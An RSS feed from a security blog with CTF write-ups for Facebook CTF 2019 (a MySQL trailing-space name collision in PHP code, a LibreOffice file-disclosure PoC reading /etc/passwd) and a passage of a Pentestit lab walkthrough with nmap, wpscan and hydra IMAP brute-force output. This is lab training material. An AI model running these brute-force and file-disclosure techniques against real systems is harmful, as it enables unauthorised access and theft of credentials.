<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>💻 | Blog</title>
    <description>Hacking to learn, while learning to hack.
</description>
    <link>http://snoopysecurity.github.io/</link>
    <atom:link href="http://snoopysecurity.github.io/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Sat, 26 Oct 2019 18:17:13 +0100</pubDate>
    <lastBuildDate>Sat, 26 Oct 2019 18:17:13 +0100</lastBuildDate>
    <generator>Jekyll v3.2.1</generator>
    
      <item>
        <title>Facebook CTF 2019: Products Manager Writeup</title>
        <description>&lt;p&gt;This challenge was part of &lt;a href=&quot;https://www.fbctf.com/&quot;&gt;Facebook CTF &lt;/a&gt;. Looking at the challenge tab, the following information is provided:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/7.png&quot; alt=&quot;alt text&quot; title=&quot;img7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Going to the provided URL, this leads to the following web application where you can add and view your own products.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/8.png&quot; alt=&quot;alt text&quot; title=&quot;image9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Going to the view products area shows the top 5 products within the application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/10.png&quot; alt=&quot;alt text&quot; title=&quot;image10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To add a product, a secret needs to be created. After a product is added, this can be viewed and by submitting the product name and the secret. The source code the application is also provided for the challenge.&lt;/p&gt;

&lt;p&gt;index.php&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php

require_once(&quot;db.php&quot;);

$products = get_top_products();

require_once(&quot;header.php&quot;);
?&amp;gt;

&amp;lt;p&amp;gt;
  &amp;lt;ul&amp;gt;
&amp;lt;?php
foreach ($products as $product) {
  echo &quot;&amp;lt;li&amp;gt;&quot; . htmlentities($product['name']) . &quot;&amp;lt;/li&amp;gt;&quot;;
}
?&amp;gt;
  &amp;lt;/ul&amp;gt;
&amp;lt;/p&amp;gt;

&amp;lt;?php require_once(&quot;footer.php&quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;db.php&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
/*
CREATE TABLE products (
  name char(64),
  secret char(64),
  description varchar(250)
);

INSERT INTO products VALUES('facebook', sha256(....), 'FLAG_HERE');
INSERT INTO products VALUES('messenger', sha256(....), ....);
INSERT INTO products VALUES('instagram', sha256(....), ....);
INSERT INTO products VALUES('whatsapp', sha256(....), ....);
INSERT INTO products VALUES('oculus-rift', sha256(....), ....);
*/
error_reporting(0);
require_once(&quot;config.php&quot;); // DB config

$db = new mysqli($MYSQL_HOST, $MYSQL_USERNAME, $MYSQL_PASSWORD, $MYSQL_DBNAME);

if ($db-&amp;gt;connect_error) {
  die(&quot;Connection failed: &quot; . $db-&amp;gt;connect_error);
}

function check_errors($var) {
  if ($var === false) {
    die(&quot;Error. Please contact administrator.&quot;);
  }
}

function get_top_products() {
  global $db;
  $statement = $db-&amp;gt;prepare(
    &quot;SELECT name FROM products LIMIT 5&quot;
  );
  check_errors($statement);
  check_errors($statement-&amp;gt;execute());
  $res = $statement-&amp;gt;get_result();
  check_errors($res);
  $products = [];
  while ( ($product = $res-&amp;gt;fetch_assoc()) !== null) {
    array_push($products, $product);
  }
  $statement-&amp;gt;close();
  return $products;
}

function get_product($name) {
  global $db;
  $statement = $db-&amp;gt;prepare(
    &quot;SELECT name, description FROM products WHERE name = ?&quot;
  );
  check_errors($statement);
  $statement-&amp;gt;bind_param(&quot;s&quot;, $name);
  check_errors($statement-&amp;gt;execute());
  $res = $statement-&amp;gt;get_result();
  check_errors($res);
  $product = $res-&amp;gt;fetch_assoc();
  $statement-&amp;gt;close();
  return $product;
}

function insert_product($name, $secret, $description) {
  global $db;
  $statement = $db-&amp;gt;prepare(
    &quot;INSERT INTO products (name, secret, description) VALUES
      (?, ?, ?)&quot;
  );
  check_errors($statement);
  $statement-&amp;gt;bind_param(&quot;sss&quot;, $name, $secret, $description);
  check_errors($statement-&amp;gt;execute());
  $statement-&amp;gt;close();
}

function check_name_secret($name, $secret) {
  global $db;
  $valid = false;
  $statement = $db-&amp;gt;prepare(
    &quot;SELECT name FROM products WHERE name = ? AND secret = ?&quot;
  );
  check_errors($statement);
  $statement-&amp;gt;bind_param(&quot;ss&quot;, $name, $secret);
  check_errors($statement-&amp;gt;execute());
  $res = $statement-&amp;gt;get_result();
  check_errors($res);
  if ($res-&amp;gt;fetch_assoc() !== null) {
    $valid = true;
  }
  $statement-&amp;gt;close();
  return $valid;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;view.php&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php

require_once(&quot;db.php&quot;);
require_once(&quot;header.php&quot;);

function handle_post() {
  global $_POST;

  $name = $_POST[&quot;name&quot;];
  $secret = $_POST[&quot;secret&quot;];

  if (isset($name) &amp;amp;&amp;amp; $name !== &quot;&quot;
        &amp;amp;&amp;amp; isset($secret) &amp;amp;&amp;amp; $secret !== &quot;&quot;) {
    if (check_name_secret($name, hash('sha256', $secret)) === false) {
      return &quot;Incorrect name or secret, please try again&quot;;
    }

    $product = get_product($name);

    echo &quot;&amp;lt;p&amp;gt;Product details:&quot;;
    echo &quot;&amp;lt;ul&amp;gt;&amp;lt;li&amp;gt;&quot; . htmlentities($product['name']) . &quot;&amp;lt;/li&amp;gt;&quot;;
    echo &quot;&amp;lt;li&amp;gt;&quot; . htmlentities($product['description']) . &quot;&amp;lt;/li&amp;gt;&amp;lt;/ul&amp;gt;&amp;lt;/p&amp;gt;&quot;;
  }

  return null;
}

$error = handle_post();
if ($error !== null) {
  echo &quot;&amp;lt;p&amp;gt;Error: &quot; . $error . &quot;&amp;lt;/p&amp;gt;&quot;;
}
?&amp;gt;
&amp;lt;form action=&quot;/view.php&quot; method=&quot;POST&quot;&amp;gt;
  Name: &amp;lt;input type=&quot;text&quot; name=&quot;name&quot; /&amp;gt;&amp;lt;br /&amp;gt;
  Secret: &amp;lt;input type=&quot;password&quot; name=&quot;secret&quot; /&amp;gt;&amp;lt;br /&amp;gt;
  &amp;lt;input type=&quot;submit&quot; value=&quot;View&quot; /&amp;gt;
&amp;lt;/form&amp;gt;

&amp;lt;?php require_once(&quot;footer.php&quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;add.php&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php

require_once(&quot;db.php&quot;);
require_once(&quot;header.php&quot;);

function validate_secret($secret) {
  if (strlen($secret) &amp;lt; 10) {
    return false;
  }
  $has_lowercase = false;
  $has_uppercase = false;
  $has_number = false;
  foreach (str_split($secret) as $ch) {
    if (ctype_lower($ch)) {
      $has_lowercase = true;
    } else if (ctype_upper($ch)) {
      $has_uppercase = true;
    } else if (is_numeric($ch)) {
      $has_number = true;
    }
  }
  return $has_lowercase &amp;amp;&amp;amp; $has_uppercase &amp;amp;&amp;amp; $has_number;
}

function handle_post() {
  global $_POST;

  $name = $_POST[&quot;name&quot;];
  $secret = $_POST[&quot;secret&quot;];
  $description = $_POST[&quot;description&quot;];

  if (isset($name) &amp;amp;&amp;amp; $name !== &quot;&quot;
        &amp;amp;&amp;amp; isset($secret) &amp;amp;&amp;amp; $secret !== &quot;&quot;
        &amp;amp;&amp;amp; isset($description) &amp;amp;&amp;amp; $description !== &quot;&quot;) {
    if (validate_secret($secret) === false) {
      return &quot;Invalid secret, please check requirements&quot;;
    }

    $product = get_product($name);
    if ($product !== null) {
      return &quot;Product name already exists, please enter again&quot;;
    }

    insert_product($name, hash('sha256', $secret), $description);

    echo &quot;&amp;lt;p&amp;gt;Product has been added&amp;lt;/p&amp;gt;&quot;;
  }

  return null;
}

$error = handle_post();
if ($error !== null) {
  echo &quot;&amp;lt;p&amp;gt;Error: &quot; . $error . &quot;&amp;lt;/p&amp;gt;&quot;;
}
?&amp;gt;
&amp;lt;form action=&quot;/add.php&quot; method=&quot;POST&quot;&amp;gt;
  Name of your product: &amp;lt;input type=&quot;text&quot; name=&quot;name&quot; /&amp;gt;&amp;lt;br /&amp;gt;
  Secret (10+ characters, smallcase, uppercase, number) : &amp;lt;input type=&quot;password&quot; name=&quot;secret&quot; /&amp;gt;&amp;lt;br /&amp;gt;
  Description: &amp;lt;input type=&quot;text&quot; name=&quot;description&quot; /&amp;gt;&amp;lt;br /&amp;gt;
  &amp;lt;input type=&quot;submit&quot; value=&quot;Add&quot; /&amp;gt;
&amp;lt;/form&amp;gt;

&amp;lt;?php require_once(&quot;footer.php&quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Looking at the comments, there is information regarding where the flag is hidden.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/*
INSERT INTO products VALUES('facebook', sha256(....), 'FLAG_HERE');
INSERT INTO products VALUES('messenger', sha256(....), ....);
INSERT INTO products VALUES('instagram', sha256(....), ....);
INSERT INTO products VALUES('whatsapp', sha256(....), ....);
INSERT INTO products VALUES('oculus-rift', sha256(....), ....);
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;It seems like the goal of this challenge is to read the description value of the facebook product. This could be possible through SQL injection or brute force of the secret value/field. Looking at the source code, prepared statements seems to be in use.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $statement = $db-&amp;gt;prepare(
    &quot;SELECT name FROM products WHERE name = ? AND secret = ?&quot;
  );
  check_errors($statement);
  $statement-&amp;gt;bind_param(&quot;ss&quot;, $name, $secret);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Futhermore, the secret value is also hashed using SHA256 and compared to the one in the database. Looking at the source code, it also not possible to confuse the application by inserting the same product name since checks are in place.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    $product = get_product($name);
    if ($product !== null) {
      return &quot;Product name already exists, please enter again&quot;;
    }

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;However the following code looks like an entry point&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function get_product($name) {
  global $db;
  $statement = $db-&amp;gt;prepare(
    &quot;SELECT name, description FROM products WHERE name = ?&quot;
  );
  check_errors($statement);
  $statement-&amp;gt;bind_param(&quot;s&quot;, $name);
  check_errors($statement-&amp;gt;execute());
  $res = $statement-&amp;gt;get_result();
  check_errors($res);
  $product = $res-&amp;gt;fetch_assoc();
  $statement-&amp;gt;close();
  return $product;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Tracing the code to where it is being called (see below), the following can be deduced.The &lt;code class=&quot;highlighter-rouge&quot;&gt;check_name_secret&lt;/code&gt; function checks if a product exists with the entered name and secret value. However, the &lt;code class=&quot;highlighter-rouge&quot;&gt;get_product function&lt;/code&gt; only returns one row from the database by using the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; parameter. As such, you could add another product called facebook with a secret and get the application program to return the first already creadted product found with the name facebook.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function handle_post() {
  global $_POST;

  $name = $_POST[&quot;name&quot;];
  $secret = $_POST[&quot;secret&quot;];

  if (isset($name) &amp;amp;&amp;amp; $name !== &quot;&quot;
        &amp;amp;&amp;amp; isset($secret) &amp;amp;&amp;amp; $secret !== &quot;&quot;) {
    if (check_name_secret($name, hash('sha256', $secret)) === false) {
      return &quot;Incorrect name or secret, please try again&quot;;
    }

    $product = get_product($name);

    echo &quot;&amp;lt;p&amp;gt;Product details:&quot;;
    echo &quot;&amp;lt;ul&amp;gt;&amp;lt;li&amp;gt;&quot; . htmlentities($product['name']) . &quot;&amp;lt;/li&amp;gt;&quot;;
    echo &quot;&amp;lt;li&amp;gt;&quot; . htmlentities($product['description']) . &quot;&amp;lt;/li&amp;gt;&amp;lt;/ul&amp;gt;&amp;lt;/p&amp;gt;&quot;;
  }

  return null;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This vulnerability could be exploited using a vulnerability similiar to SQL Truncation Attack. This is due to MySQL comparing values within taking into account trailing spaces. Here we will enter a product with spaces e.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;facebook&amp;lt;space&amp;gt;&lt;/code&gt; into the application which will be stored within the database. This will then become &lt;code class=&quot;highlighter-rouge&quot;&gt;facebook&lt;/code&gt; when we try to view the product again due to the comparison issue and we can view the facebook product to acquire our flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/11.png&quot; alt=&quot;alt text&quot; title=&quot;image11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The flag can be seen below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/12.png&quot; alt=&quot;alt text&quot; title=&quot;image12&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Sat, 08 Jun 2019 10:00:00 +0100</pubDate>
        <link>http://snoopysecurity.github.io/capture_the_flag/2019/06/08/10_Facebook_CTF_product_manager.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/capture_the_flag/2019/06/08/10_Facebook_CTF_product_manager.html</guid>
        
        
        <category>capture_the_flag</category>
        
      </item>
    
      <item>
        <title>Facebook CTF 2019 : pdfme Writeup</title>
        <description>&lt;p&gt;This challenge was part of &lt;a href=&quot;https://www.fbctf.com/&quot;&gt;Facebook CTF &lt;/a&gt;. Looking at the challenge tab, the following information is provided:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/1.png&quot; alt=&quot;alt text&quot; title=&quot;challengearea&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The goal of this challenge is the exploit the PDF conversion service seen below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/2.png&quot; alt=&quot;alt text&quot; title=&quot;image2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the upload page, a file with &lt;code class=&quot;highlighter-rouge&quot;&gt;.fods&lt;/code&gt; extension can be uploaded. This extension corresponds to the OpenDocument Spreadsheet format: &lt;a href=&quot;http://fileformats.archiveteam.org/wiki/OpenDocument_Spreadsheet&quot;&gt;OpenDocument_Spreadsheet Fileformat&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Lets try to see if we can fake and extension and what result gets uploaded.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &quot;Hello World&quot; &amp;gt; test.fods
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Uploading the above file was successful and a PDF was generated.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/3.png&quot; alt=&quot;alt text&quot; title=&quot;image3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Examining the metadata of the produced PDF tells us the LibreOffice 6.0 is used for conversion of the &lt;code class=&quot;highlighter-rouge&quot;&gt;.fods&lt;/code&gt; file by the application.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sams@sams-snyk:~$ exiftool 1.pdf 
ExifTool Version Number         : 10.80
File Name                       : 1.pdf
Directory                       : .
File Size                       : 7.2 kB
File Modification Date/Time     : 2019:06:07 23:46:55+01:00
File Access Date/Time           : 2019:06:07 23:47:00+01:00
File Inode Change Date/Time     : 2019:06:07 23:47:00+01:00
File Permissions                : rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Language                        : en-US
Creator                         : Writer
Producer                        : LibreOffice 6.0
Create Date                     : 2019:06:07 22:46:45Z

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This shows us that the web application is converting the  file to a PDF using LibreOffice 6.0 Calc. By searching exploit-db for relevant vulnerabilities, the following exploit looks probable to work - &lt;a href=&quot;https://www.exploit-db.com/exploits/44022&quot;&gt;www.exploit-db.com/exploits/44022&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The author also provided a GitHub Repository where the PoC code can be downloaded: &lt;a href=&quot;https://raw.githubusercontent.com/jollheef/libreoffice-remote-arbitrary-file-disclosure/master/poc.fods&quot;&gt;poc.fods&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The proof of concept code can be used to read the passwd file within the application’s hosted linux system. Uploading the provided PoC and looking at the created PDF, you can see the passwd file on the system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/4.png&quot; alt=&quot;alt text&quot; title=&quot;image4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Retrieval of the passwd file tells us that the home directory of the &lt;code class=&quot;highlighter-rouge&quot;&gt;libreoffice_admin user&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/libreoffice_admin&lt;/code&gt;. After multiple attempts, the flag was found to be within the follow directory path: &lt;code class=&quot;highlighter-rouge&quot;&gt;home/libreoffice_admin/flag&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/facebookctf/6.png&quot; alt=&quot;alt text&quot; title=&quot;image6&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Sat, 08 Jun 2019 10:00:00 +0100</pubDate>
        <link>http://snoopysecurity.github.io/capture_the_flag/2019/06/08/10_Facebook_CTF_pdfme.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/capture_the_flag/2019/06/08/10_Facebook_CTF_pdfme.html</guid>
        
        
        <category>capture_the_flag</category>
        
      </item>
    
      <item>
        <title>Pentestit TestLab V12 Walkthrough</title>
        <description>&lt;p&gt;This walkthrough shows the process I used to capture and complete some systems within the Pentestit v12 test lab. This walkthrough contains my field notes I took when I was working through the box. The “Test lab” is presented as a computer network of virtual companies containing widely of distributed misconfigurations and vulnerabilities. Players will need to discover vulnerable hosts, exploit them and then find the token.&lt;/p&gt;

&lt;h3 id=&quot;mail-token&quot;&gt;Mail Token&lt;/h3&gt;

&lt;p&gt;The first step consists of the reconnaissance phase as ports scanning, banner grabbing, misconfigurations and so on. Once you create a free account, Pentestit will provide you a VPN configuration which you can then use to connect to the TestLab network. Once connected, the Lab gateways are &lt;strong&gt;192.168.101.12&lt;/strong&gt; and &lt;strong&gt;192.168.101.13&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;A port scan of the .12 system shows the following services open.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:# nmap -sV 192.168.101.12 -T4 -p- -vv

Completed Service scan at 13:58, 8.28s elapsed (4 services on 1 host)
NSE: Script scanning 192.168.101.12.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 1.49s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 0.00s elapsed
Nmap scan report for site.test.lab (192.168.101.12)
Host is up, received echo-reply ttl 62 (0.12s latency).
Scanned at 2019-01-19 13:53:27 EST for 329s
Not shown: 65531 filtered ports
Reason: 65531 no-responses
PORT     STATE SERVICE REASON         VERSION
25/tcp   open  smtp    syn-ack ttl 61 Postfix smtpd
80/tcp   open  http    syn-ack ttl 61 nginx 1.14.2
143/tcp  open  imap    syn-ack ttl 61 Dovecot imapd
8080/tcp open  http    syn-ack ttl 61 nginx
Service Info: Host: -mail.test.lab

Read data files from: /usr/bin/../share/nmap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Browsing to port 80 shows a WordPress site in use and a Roundcube Webmail instance was discoverable on port 8080. After quickly discovering the virtual host is called site.test.lab, the /etc/hosts file can be modified to include this information. WPScan can be used to enumerate the WordPress installation&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:# wpscan --url http://site.test.lab --random-user-agent
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.3.1
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://site.test.lab/
[+] Started: Fri Jan 18 18:18:44 2019

Interesting Finding(s):

[+] http://site.test.lab/
 | Interesting Entry: Server: nginx/1.14.2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://site.test.lab/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 4.9.8 identified.
 | Detected By: Rss Generator (Passive Detection)
 |  - http://site.test.lab/?feed=rss2, &amp;lt;generator&amp;gt;https://wordpress.org/?v=4.9.8&amp;lt;/generator&amp;gt;
 |  - http://site.test.lab/?feed=comments-rss2, &amp;lt;generator&amp;gt;https://wordpress.org/?v=4.9.8&amp;lt;/generator&amp;gt;
 |
 | [!] 7 vulnerabilities identified:
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - Authenticated File Delete
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9169
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - Authenticated Post Type Bypass
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9170
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - PHP Object Injection via Meta Data
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9171
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9172
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9173
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - User Activation Screen Search Engine Indexing
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9174
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - File Upload to XSS on Apache Web Servers
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9175
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a

[+] WordPress theme in use: twentyseventeen
 | Location: http://site.test.lab/wp-content/themes/twentyseventeen/
 | Last Updated: 2019-01-09T00:00:00.000Z
 | Readme: http://site.test.lab/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.0
 | Style URL: http://site.test.lab/wp-content/themes/twentyseventeen/style.css?ver=4.9.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Detected By: Css Style (Passive Detection)
 |
 | Version: 1.7 (80% confidence)
 | Detected By: Style (Passive Detection)
 |  - http://site.test.lab/wp-content/themes/twentyseventeen/style.css?ver=4.9.8, Match: 'Version: 1.7'

[+] Enumerating All Plugins
[+] Checking Plugin Versions

[i] Plugin(s) Identified:

[+] wp-survey-and-poll
 | Location: http://site.test.lab/wp-content/plugins/wp-survey-and-poll/
 | Last Updated: 2019-01-14T22:50:00.000Z
 | [!] The version is out of date, the latest version is 1.5.8
 |
 | Detected By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.5.7.8 (50% confidence)
 | Detected By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://site.test.lab/wp-content/plugins/wp-survey-and-poll/readme.txt

[+] Enumerating Config Backups
 Checking Config Backups - Time: 00:00:00 &amp;lt;===============================================================================================&amp;gt; (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Finished: Fri Jan 18 18:18:52 2019
[+] Requests Done: 53
[+] Memory used: 60.688 MB
[+] Elapsed time: 00:00:07
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Spidering of the application also revealed additional information regarding the themes and plugins in use. However, these were found hard to exploit due to the use of a Web Application Firewall within the WordPress application. However, by looking at the main WordPress webpage. It was possible to identify a email/username.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/1.JPG&quot; alt=&quot;alt text&quot; title=&quot;wordpressuser&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using this username, brute force attacks can now be conducted to possibly get access to to to the Roundcube Webmail instance, WordPress dashboard, or the IMAP. After trying all three potential targets, the password of the info user was successfully brute forced by leveraging the IMAP service.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/# hydra -l info@test.lab -P /root/rockyou.txt imap://192.168.101.12/PLAIN
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2019-01-19 14:08:43
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking imap://192.168.101.12:143/PLAIN
[143][imap] host: 192.168.101.12   login: info@test.lab   password: 123456789
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2019-01-19 14:08:50
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Using the found password, it was possible to successfully login to the Roundcube Webmail as the &lt;strong&gt;info&lt;/strong&gt; user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/2.JPG&quot; alt=&quot;alt text&quot; title=&quot;roundcube&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking through the info user’s emails, it was possible to find the Mail token, and get hold of a VPN configuration file. A possible username called &lt;strong&gt;sviridov@test.lab&lt;/strong&gt; was also found my looking through the inbox.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/3.JPG&quot; alt=&quot;alt text&quot; title=&quot;vpnconfig&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;dns-token&quot;&gt;DNS Token&lt;/h3&gt;

&lt;p&gt;Using the found credentials and the VPN config file, a VPN connection can be established and tunnelled through the already established VPN connection. This can be done as seen below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/4.JPG&quot; alt=&quot;alt text&quot; title=&quot;secondvpnconnection&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By looking around, the new subnet that is accessible seems to be &lt;code class=&quot;highlighter-rouge&quot;&gt;172.16.0.0/16&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:# ip ro show dev tun1
10.11.0.1 via 10.11.0.25 
10.11.0.25 proto kernel scope link src 10.11.0.26 
172.16.0.0/16 via 10.11.0.25 
root@kali:~# 
